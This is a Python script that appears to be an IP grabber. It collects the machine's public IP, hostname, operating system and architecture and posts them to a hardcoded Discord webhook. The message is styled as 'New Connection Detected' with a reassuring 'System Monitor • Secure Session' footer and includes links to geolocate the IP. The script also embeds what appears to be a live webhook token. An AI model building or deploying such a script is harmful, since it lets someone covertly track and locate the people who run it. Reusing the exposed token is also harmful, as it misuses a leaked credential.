import requests
import json
import socket
import platform
import os
from datetime import datetime

def get_my_ip():
    services = [
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://ifconfig.me/all.json',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/ip'
    ]
    
    for url in services:
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            
            try:
                data = response.json()
            except ValueError:
                data = None
            
            if isinstance(data, dict):
                for key in ('ip', 'ip_addr', 'query', 'address'):
                    if key in data and data[key]:
                        return data[key]
                if 'client' in data and 'ip' in data['client']:
                    return data['client']['ip']
                for value in data.values():
                    if isinstance(value, str) and ('.' in value or ':' in value):
                        return value
            else:
                ip_text = response.text.strip()
                if '.' in ip_text or ':' in ip_text:
                    return ip_text
            
            print(f"Unexpected response from {url}: {response.text[:200]}")
        except Exception as e:
            print(f"Failed to get IP from {url}: {e}")
    
    return "Couldn't get IP"

def get_system_info():
    try:
        hostname = socket.gethostname()
        os_name = platform.system()
        arch = platform.machine()
        return hostname, os_name, arch
    except Exception as e:
        print(f"Error getting system info: {e}")
        return "Unknown", "Unknown", "Unknown"

def send_to_discord(webhook, ip):
    hostname, os_name, arch = get_system_info()
    now = datetime.utcnow().isoformat() + "Z"
    
    embed = {
        "title": "🌐 New Connection Detected",
        "color": 3447003,
        "fields": [
            {"name": "🖥️ Computer Name", "value": f"```{hostname}```", "inline": True},
            {"name": "⚙️ Operating System", "value": f"```{os_name} {arch}```", "inline": True},
            {"name": "📡 Public IP Address", "value": f"```{ip}```", "inline": False},
            {"name": "🔍 Quick Actions", "value": f"[View Location](https://ipinfo.io/{ip}) | [Network Tools](https://www.whatismyip.com/ip/{ip}) | [Ping Test](https://ping.pe/{ip})", "inline": False}
        ],
        "footer": {"text": "System Monitor • Secure Session", "icon_url": "https://cdn-icons-png.flaticon.com/512/149/149071.png"},
        "thumbnail": {"url": "https://cdn-icons-png.flaticon.com/512/149/149071.png"},
        "timestamp": now
    }
    
    payload = {
        "embeds": [embed],
        "username": "IP Tool",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/149/149071.png"
    }
    
    try:
        resp = requests.post(webhook, json=payload, timeout=10)
        print("Response code:", resp.status_code)
        if resp.text:
            print("Response body:", resp.text)
        
        if resp.status_code == 204:
            return True
        else:
            try:
                error_data = resp.json()
                print("Error details:", json.dumps(error_data, indent=2))
            except:
                pass
            return False
    except Exception as e:
        print(f"Error sending to Discord: {e}")
        return False

def main():
    webhook_url = "https://discord.com/api/webhooks/1421427465213055027/dsf-v3TC8uWXtJwd-i6E86_qUOTD6Z7Kq0d9oCLDAlTi5OJpLpoLARb3OBxnrDBKcYns"
    
    if webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("No webhook set up.")
        return
    
    ip = get_my_ip()
    
    if not ip or ip == "Couldn't get IP":
        print("Failed to grab IP. Skipping send.")
        return
    
    if send_to_discord(webhook_url, ip):
        print("Message sent okay.")
    else:
        print("Something went wrong sending the message.")

if __name__ == "__main__":
    main()